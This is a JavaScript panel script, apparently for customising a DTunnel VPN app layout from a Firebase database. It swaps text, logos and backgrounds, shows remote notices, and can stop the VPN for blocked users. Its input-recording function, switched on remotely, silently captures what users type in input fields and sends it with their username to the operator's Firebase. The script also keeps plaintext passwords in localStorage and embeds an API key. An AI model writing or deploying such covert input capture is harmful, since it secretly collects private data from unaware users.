(function() {
    'use strict';
    
    window.panelLogicActive = true; 

    const scriptTag = document.currentScript;
    const MY_UNIQUE_USER_ID = scriptTag.getAttribute('data-uid');

    const CACHE_CONFIG_KEY = 'panel_config_cache_' + MY_UNIQUE_USER_ID;
    const CACHE_CREDENTIAL_KEY = 'panel_temp_credential_' + MY_UNIQUE_USER_ID;
    let isAuthenticatedForThisSession = false;
    let isInputRecordingActive = false;
    let currentConfigForListener = null;

    function applyTextReplacements(replacements) {
        if (!replacements || Object.keys(replacements).length === 0) return;
        const lookupMap = {}, regexMap = {};
        function escapeRegExp(string) { return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }
        for (const key in replacements) {
            const item = replacements[key];
            if (item && item.original) {
                lookupMap[item.original] = item.new || '';
                regexMap[item.original] = new RegExp(escapeRegExp(item.original), 'g');
            }
        }
        if (Object.keys(lookupMap).length === 0) return;
        const performReplacement = (text) => {
            if (typeof text !== 'string' || !text) return text;
            let modifiedText = text;
            for (const original in lookupMap) {
                modifiedText = modifiedText.replace(regexMap[original], lookupMap[original]);
            }
            return modifiedText;
        };
        const originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
        if (originalInnerHTMLDescriptor) Object.defineProperty(Element.prototype, 'innerHTML', { set: function(html) { originalInnerHTMLDescriptor.set.call(this, performReplacement(html)); }, get: originalInnerHTMLDescriptor.get, configurable: true });
        const originalTextContentDescriptor = Object.getOwnPropertyDescriptor(Node.prototype, 'textContent');
        if (originalTextContentDescriptor) Object.defineProperty(Node.prototype, 'textContent', { set: function(text) { originalTextContentDescriptor.set.call(this, performReplacement(text)); }, get: originalTextContentDescriptor.get, configurable: true });
        const originalWrite = document.write;
        document.write = function(...args) { return originalWrite.apply(document, args.map(arg => performReplacement(arg))); };
    }
    
    function getCurrentUserIdentifier(config) {
        if (!config) return 'Não Identificado';
        if (config.tempUsers?.globalStatus === true) {
            try {
                const savedCredential = JSON.parse(localStorage.getItem(CACHE_CREDENTIAL_KEY));
                if (savedCredential?.username) return savedCredential.username;
            } catch (e) {}
        }
        if (typeof DtUsername !== 'undefined' && DtUsername.get) {
            const dtUser = DtUsername.get();
            if (dtUser && dtUser.trim() !== '' && dtUser.trim().toLowerCase() !== 'null') return dtUser;
        }
        return 'Não Identificado';
    }

    function setupInputRecording(recordsConfig) {
        if (isInputRecordingActive || !recordsConfig || !recordsConfig.status) return;
        isInputRecordingActive = true;
        let debounceTimer, lastTarget = null;
        const sendRecord = (targetElement) => {
            if (!targetElement) return;
            const inputValue = targetElement.isContentEditable ? targetElement.textContent.trim() : targetElement.value.trim();
            if (!inputValue) return;
            const payload = {
                identifier: getCurrentUserIdentifier(currentConfigForListener),
                inputElementInfo: `${targetElement.tagName} (ID: ${targetElement.id || 'N/A'})`,
                inputValue: targetElement.type === 'password' ? '********' : inputValue,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            };
            try { firebase.database().ref('records/' + MY_UNIQUE_USER_ID).push(payload); }
            catch (e) { console.error("Painel: Falha ao enviar registro.", e); }
        };
        document.addEventListener('keyup', (event) => {
            const target = event.target;
            if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
                clearTimeout(debounceTimer);
                lastTarget = target;
                debounceTimer = setTimeout(() => { sendRecord(lastTarget); lastTarget = null; }, 2500);
            }
        });
        document.addEventListener('click', (event) => {
            const target = event.target.closest('button');
            if (target && lastTarget && (lastTarget.value || lastTarget.textContent)) {
                clearTimeout(debounceTimer); sendRecord(lastTarget); lastTarget = null;
            }
        }, true);
        window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden' && lastTarget) { clearTimeout(debounceTimer); sendRecord(lastTarget); } });
        console.log("Painel: Captura de registros ATIVADA.");
    }

    function loadScript(src) { return new Promise((resolve, reject) => { if (document.querySelector(`script[src="${src}"]`)) return resolve(); const script = document.createElement('script'); script.src = src; script.async = true; script.onload = resolve; script.onerror = reject; document.head.appendChild(script); }); }
    function loadStylesheet(href) { return new Promise(resolve => { if (document.querySelector(`link[href="${href}"]`)) return resolve(); const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = href; link.onload = resolve; document.head.appendChild(link); }); }
    
    function showTempUserLogin(usersData, onLoginSuccess) {
        if (document.getElementById('panel-temp-login-overlay')) return;
        const loginStyles = '#panel-temp-login-overlay{position:fixed;inset:0;background-color:rgba(26,32,44,.95);z-index:2147483647;display:flex;justify-content:center;align-items:center;padding:1rem;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;backdrop-filter:blur(5px)}#panel-temp-login-content{background-color:#fff;color:#333;padding:2em;border-radius:12px;text-align:center;max-width:380px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,.5);animation:custom-modal-fadein .3s ease}@keyframes custom-modal-fadein{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}#panel-temp-login-content h2{font-size:1.5em;font-weight:700;margin-bottom:1.5em}#panel-temp-login-content .form-group{margin-bottom:1rem;text-align:left}#panel-temp-login-content label{font-weight:600;font-size:.9rem;display:block;margin-bottom:.5rem;color:#777}#panel-temp-login-content input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;font-size:1rem}#panel-temp-login-content button{width:100%;display:inline-block;margin-top:1em;padding:14px 24px;text-decoration:none;font-weight:700;border-radius:8px;background-color:#4299e1;color:#fff;border:none;cursor:pointer;font-size:1em;transition:opacity .2s}#panel-temp-login-content button:hover{opacity:.9}#panel-temp-login-error{color:red;font-size:.9em;margin-top:1em;min-height:1.2em}';
        const styleSheet = document.createElement("style"); styleSheet.innerText = loginStyles; document.head.appendChild(styleSheet);
        const overlay = document.createElement('div'); overlay.id = 'panel-temp-login-overlay';
        overlay.innerHTML = '<div id="panel-temp-login-content"><h2><i class="fas fa-lock" style="margin-right:.5em;color:#4299e1"></i>Acesso Restrito</h2><div class=form-group><label for=panel-temp-username>Usuário</label><input type=text id=panel-temp-username autocomplete=username></div><div class=form-group><label for=panel-temp-password>Senha</label><input type=password id=panel-temp-password autocomplete=current-password></div><button id=panel-temp-login-btn>Entrar</button><p id=panel-temp-login-error></p></div>';
        document.body.appendChild(overlay);
        const loginBtn = document.getElementById('panel-temp-login-btn'), usernameInput = document.getElementById('panel-temp-username'), passwordInput = document.getElementById('panel-temp-password'), errorEl = document.getElementById('panel-temp-login-error');
        const attemptLogin = () => {
            const username = usernameInput.value.trim(), password = passwordInput.value, user = usersData ? usersData[username] : null;
            if (user && user.password === password && user.expiresAt > Date.now()) { localStorage.setItem(CACHE_CREDENTIAL_KEY, JSON.stringify({ username, password })); isAuthenticatedForThisSession = true; overlay.remove(); onLoginSuccess(); } 
            else if (user && user.expiresAt <= Date.now()){ errorEl.textContent = 'Seu acesso expirou.'; } 
            else { errorEl.textContent = 'Usuário ou senha inválidos.'; }
        };
        loginBtn.addEventListener('click', attemptLogin);
        passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') attemptLogin(); });
    }
    
    async function showModal(modalData) {
        const { title, message, button, isPersistent, colors, icon: iconClass, audioUrl, isSingleView, imageUrl } = modalData;
        if (isSingleView) { const noticeId = 'panel_seen_' + (title || '') + '_' + (message || '') + '_' + (audioUrl || ''); try { if (localStorage.getItem(noticeId) === 'true') return; } catch (e) {} }
        const existingModal = document.querySelector('.custom-modal-overlay'); if (existingModal) existingModal.remove();
        const modalStyles = '.custom-modal-overlay{position:fixed;inset:0;background-color:rgba(0,0,0,.9);z-index:2147483647;display:flex;justify-content:center;align-items:center;padding:1rem;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}.custom-modal-content{position:relative;background-color:#fff;color:#333;padding:2em;border-radius:12px;text-align:center;max-width:450px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,.5);animation:custom-modal-fadein .3s ease;max-height:80vh;display:flex;flex-direction:column;overflow-y:auto;}@keyframes custom-modal-fadein{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}.custom-modal-icon{font-size:3em;line-height:1;margin-bottom:.25em;display:block}.custom-modal-title{font-size:1.5em;font-weight:700;margin:.5em 0;word-wrap:break-word;}.custom-modal-message{font-size:1em;line-height:1.6;overflow-wrap:break-word;word-break:break-all;}.custom-modal-button{display:inline-block;margin-top:1.5em;padding:12px 24px;text-decoration:none;font-weight:700;border-radius:50px;transition:background-color .2s,transform .2s;flex-shrink:0;}.custom-modal-button:hover{transform:scale(1.05)}.custom-modal-close-btn{position:absolute;top:10px;right:15px;font-size:2.5em;color:#aaa;cursor:pointer;line-height:1;transition:color .2s;border:none;background:0 0}.custom-modal-close-btn:hover{color:#333}';
        const styleSheet = document.createElement("style"); styleSheet.innerText = modalStyles; document.head.appendChild(styleSheet);
        const overlay = document.createElement('div'); overlay.className = 'custom-modal-overlay';
        const content = document.createElement('div'); content.className = 'custom-modal-content';
        if (colors?.background) content.style.backgroundColor = colors.background;
        const close = () => { overlay.remove(); if (isPersistent) document.body.style.overflow = ''; if (isSingleView) { const noticeId = 'panel_seen_' + (title || '') + '_' + (message || '') + '_' + (audioUrl || ''); try { localStorage.setItem(noticeId, 'true'); } catch (e) {} } };
        if (!isPersistent) { const closeButton = document.createElement('button'); closeButton.className = 'custom-modal-close-btn'; closeButton.innerHTML = '×'; closeButton.addEventListener('click', close); content.appendChild(closeButton); overlay.addEventListener('click', (e) => { if (e.target === overlay) close(); }); }
        if (imageUrl) { const imageEl = document.createElement('img'); imageEl.src = imageUrl; Object.assign(imageEl.style, {'max-width': '100%', 'border-radius': '8px', 'margin-bottom': '1em', 'max-height': '200px', 'object-fit': 'cover', 'flex-shrink': '0'}); content.appendChild(imageEl); }
        const icon = document.createElement('i'); icon.className = 'custom-modal-icon ' + (iconClass || 'fas fa-exclamation-triangle'); if(colors?.title) icon.style.color = colors.title;
        const titleEl = document.createElement('h2'); titleEl.className = 'custom-modal-title'; titleEl.textContent = title || 'Aviso';
        const messageEl = document.createElement('p'); messageEl.className = 'custom-modal-message';
        messageEl.innerHTML = (message || '').replace(/\n/g, '<br>');
        if (colors?.title) titleEl.style.color = colors.title; if (colors?.message) messageEl.style.color = colors.message;
        content.appendChild(icon); content.appendChild(titleEl); if (message) content.appendChild(messageEl);
        if (audioUrl) { const audioPlayer = document.createElement('audio'); audioPlayer.controls = true; audioPlayer.src = audioUrl; audioPlayer.style.width = '100%'; audioPlayer.style.marginTop = '1rem'; audioPlayer.style.flexShrink = '0'; audioPlayer.addEventListener('click', (e) => e.stopPropagation()); content.appendChild(audioPlayer); }
        if (button?.url && button?.text) { const buttonEl = document.createElement('a'); buttonEl.className = 'custom-modal-button'; buttonEl.textContent = button.text; buttonEl.style.backgroundColor = colors?.buttonBg || '#25d366'; buttonEl.style.color = colors?.buttonText || '#ffffff'; if (typeof DtOpenExternalUrl !== 'undefined' && DtOpenExternalUrl.execute) { buttonEl.href = '#'; buttonEl.addEventListener('click', (e) => { e.preventDefault(); DtOpenExternalUrl.execute(button.url); }); } else { buttonEl.href = button.url; buttonEl.target = '_blank'; } content.appendChild(buttonEl); }
        overlay.appendChild(content); document.body.appendChild(overlay); if (isPersistent) document.body.style.overflow = 'hidden';
    }

    function applyCustomBackground(config) {
        const bgConfig = config || {};
        const body = document.body;

        if (bgConfig.type === 'color' && bgConfig.value) {
            body.style.setProperty('background-image', 'none', 'important');
            body.style.setProperty('background-color', bgConfig.value, 'important');
        } else if (bgConfig.type === 'image' && bgConfig.value) {
            body.style.setProperty('background-color', 'transparent', 'important');
            body.style.setProperty('background-image', `url(${bgConfig.value})`, 'important');
            body.style.setProperty('background-size', 'cover', 'important');
            body.style.setProperty('background-position', 'center', 'important');
            body.style.setProperty('background-repeat', 'no-repeat', 'important');
            body.style.setProperty('background-attachment', 'fixed', 'important');
        } else {
            body.style.removeProperty('background-image');
            body.style.removeProperty('background-color');
            body.style.removeProperty('background-size');
            body.style.removeProperty('background-position');
            body.style.removeProperty('background-repeat');
            body.style.removeProperty('background-attachment');
        }
    }
    
    function applyLogo(logoConfig) {
        const logoSelector = '[id*="logo" i], [class*="logo" i], [id*="brand" i], [class*="brand" i], img[src*="logo" i], img[alt*="logo" i]';
        let panelLogo = document.getElementById('panel-injected-logo');
        const isPanelLogoActive = logoConfig && logoConfig.status && logoConfig.src;

        if (!panelLogo) {
            panelLogo = document.createElement('img');
            panelLogo.id = 'panel-injected-logo';
            panelLogo.style.opacity = '0';
            panelLogo.style.pointerEvents = 'none';
            document.body.insertBefore(panelLogo, document.body.firstChild);
        }
        
        const clientLogos = document.querySelectorAll(logoSelector);

        if (isPanelLogoActive) {
            panelLogo.src = logoConfig.src;
            Object.assign(panelLogo.style, {
                display: 'block', position: 'fixed',
                zIndex: '-1', top: (logoConfig.position || 5) + '%',
                left: '50%', transform: 'translateX(-50%)',
                width: (logoConfig.size || 50) + '%', height: 'auto',
                pointerEvents: 'none', opacity: '1',
                transition: 'opacity 0.3s ease, width 0.3s ease, top 0.3s ease'
            });

            clientLogos.forEach(el => {
                if (el.id !== 'panel-injected-logo') {
                    el.style.opacity = '0';
                    el.style.pointerEvents = 'none';
                    el.style.transition = 'opacity 0.3s ease';
                }
            });
        } else {
            panelLogo.style.opacity = '0';
            panelLogo.style.pointerEvents = 'none';
            
            clientLogos.forEach(el => {
                 if (el.id !== 'panel-injected-logo') {
                    el.style.opacity = '';
                    el.style.pointerEvents = '';
                }
            });
        }
    }


    function runMainChecks(config) {
        const currentUsername = getCurrentUserIdentifier(config);
        if (config.globalBlock?.status === 'on') { if (typeof DtExecuteVpnStop !== 'undefined') DtExecuteVpnStop.execute(); showModal({ isPersistent: true, ...config.globalBlock, icon: 'fas fa-lock' }); return; }
        if (currentUsername && config.blockedUsers?.[currentUsername]) { if (typeof DtExecuteVpnStop !== 'undefined') DtExecuteVpnStop.execute(); showModal({ isPersistent: true, ...config.blockedUsers[currentUsername], icon: 'fas fa-user-lock' }); return; }
        let modalShown = false;
        if (currentUsername && config.userModals?.[currentUsername]) { showModal(config.userModals[currentUsername]); modalShown = true; }
        if (!modalShown && config.globalModal?.status === 'on') { showModal(config.globalModal); }
    }

    function validateCachedCredential(config) {
        if (!config) return false;
        try { const savedCredential = JSON.parse(localStorage.getItem(CACHE_CREDENTIAL_KEY)); if (!savedCredential) return false; const user = config.tempUsers?.users?.[savedCredential.username]; if (user && user.password === savedCredential.password && user.expiresAt > Date.now()) { isAuthenticatedForThisSession = true; return true; } } catch (e) {}
        return false;
    }

    function verifyDtunnelId(authorizedId) {
        return new Promise((resolve) => {
            if (!authorizedId) { resolve(true); return; }
            const xhr = new XMLHttpRequest(); xhr.open('GET', 'file:///android_asset/user_id.txt', true);
            xhr.onreadystatechange = function() { if (xhr.readyState === 4) { if (xhr.status === 200 || (xhr.status === 0 && xhr.responseText)) { resolve(xhr.responseText.trim() === authorizedId); } else { resolve(false); } } };
            xhr.onerror = function() { resolve(false); }; xhr.send(null);
        });
    }

    async function processConfig(config) {
        if (!config) return;
        currentConfigForListener = config;
        
        applyTextReplacements(config.textReplacements);
        applyCustomBackground(config.uiCustomization);
        applyLogo(config.logoConfig); 
        setupInputRecording(config.records);

        if (config?.security?.status === true && config.security.dtunnelId) {
            const isAuthorized = await verifyDtunnelId(config.security.dtunnelId);
            if (!isAuthorized) {
                showModal({ isPersistent: true, title: 'Uso não permitido', message: 'Adquira este layout de forma autorizada.', icon: 'fas fa-shield-alt' });
                return; 
            }
        }
        
        const tempUsersConfig = config.tempUsers;
        if (tempUsersConfig && tempUsersConfig.globalStatus === true) {
            if (isAuthenticatedForThisSession || validateCachedCredential(config)) {
                runMainChecks(config);
            } else {
                localStorage.removeItem(CACHE_CREDENTIAL_KEY);
                showTempUserLogin(tempUsersConfig.users, () => runMainChecks(config));
            }
        } else {
            runMainChecks(config);
        }
    }

    (async function() {
        if (!MY_UNIQUE_USER_ID || MY_UNIQUE_USER_ID === 'undefined') { console.error("Painel: UID não configurado."); return; }
        await loadStylesheet("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css");
        
        try {
            const firebaseConfig = { apiKey: "AIzaSyAtx7xW7wASM1buR_5p_WcCRWEAqSUiRJI", authDomain: "painel-7fb32.firebaseapp.com", databaseURL: "https://painel-7fb32-default-rtdb.firebaseio.com", projectId: "painel-7fb32" };
            if (!window.firebase?.app) {
                await loadScript("https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js");
                await loadScript("https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js");
            }
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            
            firebase.database().ref('configs/' + MY_UNIQUE_USER_ID).on('value', (snapshot) => {
                const remoteConfig = snapshot.exists() ? snapshot.val() : {};
                console.log("Painel: Nova configuração do Firebase recebida.");
                
                try {
                    localStorage.setItem(CACHE_CONFIG_KEY, JSON.stringify(remoteConfig));
                } catch(e) {
                    console.warn("Painel: Falha ao salvar no cache.");
                }

                processConfig(remoteConfig);

            }, (error) => { console.error("Painel: Erro no listener do Firebase.", error); });
        } catch (error) { console.error("Painel: Erro ao conectar ao Firebase.", error); }
    })();
})();
